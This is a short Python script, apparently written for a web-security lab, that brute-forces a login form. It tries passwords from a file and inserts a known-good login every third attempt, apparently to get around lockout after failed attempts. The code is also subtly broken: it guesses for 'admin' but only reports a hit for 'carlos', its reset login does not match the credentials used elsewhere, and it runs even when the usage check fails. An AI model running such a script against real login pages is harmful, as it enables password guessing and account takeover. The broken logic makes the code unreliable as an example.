import requests  
import urllib3
import sys 
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def runOkie():
    with open('pass', 'r') as file:
        lines = file.readlines()
    index = 0
    count = 0 
    while index < len(lines):
        password = lines[index].strip()
        if count != 2:
            data = {'username' : 'admin', 'password' : password}
            count = count + 1
            index += 1
        else:
            data = {'username' : 'helloworld' , 'password' : 'peter'}
            count = 0 

        r = s.post(url, data, verify=False)
        soup = BeautifulSoup(r.text,'html.parser')
        checkData = soup.find(string=re.compile('Log out', re.IGNORECASE))
        if checkData:
            if data['username'] == 'carlos':
                print(f"{index} finaaly get data ")
                print("this is the data  :: ", data)
                break
            else:
                continue
        else:
            print(f"{index} falied to get the data : {data} ")
            continue
        
        # Increment the index to move to the next line






def brute_force_login(s, url):
    data = {
        'username' : 'wiener',
        'password' : 'peter'
    }

    r = s.post(url, data, verify=False)

    soup = BeautifulSoup(r.text,'html.parser')
    checkData = soup.find(string=re.compile('Log out', re.IGNORECASE))
    if checkData:
        print("finaaly get data ")
    else:
        print("falied to get the data ")



if __name__=="__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
    else:
        url = sys.argv[1].strip()
        s = requests.Session()

        # brute_force_login(s, url)
    runOkie()
    
